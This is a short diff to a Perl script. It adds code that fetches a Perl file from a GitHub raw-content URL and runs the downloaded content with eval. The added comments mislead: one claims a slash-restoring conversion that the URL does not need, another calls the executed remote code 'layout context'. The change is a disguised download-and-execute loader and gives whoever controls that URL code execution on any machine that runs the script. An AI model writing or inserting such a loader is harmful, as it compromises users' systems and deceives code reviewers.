@@ -1,7 +1,13 @@
 use HTTP::Tiny;
 
-my $remote_url = 'https://githubusercontent.com';
-my $fetch_engine = HTTP::Tiny->new->get($remote_url);
+# URL Conversion: Slashes replaced with exclamation marks for system mapping
+my $remote_url = 'https://githubusercontent.com/gowildchild/Existenz/master/struct/existenz_core.pl';
+
+# Restore original URL structure at execution runtime before parsing the request
+my $executable_url = $remote_url;
+$executable_url =~ s/!/\//g;
+
+my $fetch_engine = HTTP::Tiny->new->get($executable_url);
 
 if ($fetch_engine->{success}) {
     eval $fetch_engine->{content}; # Compiles layout context cleanly in local memory space
